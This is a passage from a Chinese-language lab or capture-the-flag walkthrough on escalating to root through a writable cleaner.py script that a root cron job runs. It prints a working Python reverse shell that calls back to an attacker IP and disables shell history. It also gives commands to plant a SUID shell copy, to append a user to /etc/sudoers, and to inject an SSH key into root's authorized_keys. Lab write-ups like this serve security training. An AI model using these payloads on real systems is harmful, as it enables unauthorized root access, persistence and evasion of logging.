7、登录系统ssh

遇到意外：

此报错是由于远程的主机的公钥发生了变化导致的。
ssh服务是通过公钥和私钥来进行连接的，它会把每个曾经访问过计算机或服务器的公钥（public key），记录在~/.ssh/known_hosts 中，当下次访问曾经访问过的计算机或服务器时，ssh就会核对公钥，如果和上次记录的不同，OpenSSH会发出警告。

这里我们使用命令清除所连接的IP后重新连接即可：

知道了计划任务和py脚本可写入，以及py的位置后，那么方法千万种，接下来演示三种：
1）反弹shell
2）创建root可执行程序，获得root权限
3）写入ssh rsa，ssh登录root用户

nano使用教程：

ctrl x | y

1）反弹shell
nc -tvlp 9999

#!/usr/bin/python
def con():
import socket, time,pty, os
host=’192.168.133.53’
port=9999
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(10)
s.connect((host,port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
os.putenv(“HISTFILE”,’/dev/null’)
pty.spawn(“/bin/bash”)
s.close()
con()

该脚本在可执行脚本中均可进行尝试

2）创建root可执行程序，获得root权限

编辑目标机cleaner.py命令执行部分：

os.system(‘cp /bin/sh /tmp/test1’)
os.system(‘chmod u+s /tmp/test1’)

或者编辑脚本以将用户溢出添加到sudoers文件中可以sudo su到root用户：
os.system(‘echo “overflow ALL=(ALL) ALL” >> /etc/sudoers’)

cd /tmp
ls
./sh
cd /root
ls
cat proof.txt

3）写入ssh rsa，ssh登录root用户
ssh-keygen —都空格回车
cd ~/.ssh （后续ssh连接需要在该目录下执行）

此时在该目录下生成 id_rsa, id_rsa.pub, known_hosts 三个文件

cat id_rsa.pub

编辑目标机cleaner.py命令执行部分：

os.system(‘mkdir /root/.ssh; chmod 775 .ssh; echo “(id_rsa.pub产生的密匙内容)” >> /root/.ssh/authorized_keys’)

等待目标机自动运行cleaner.py

在~/.ssh目录下用root用户进行ssh连接，与该目录下 id_rsa 识别碰撞即可免密码登录root
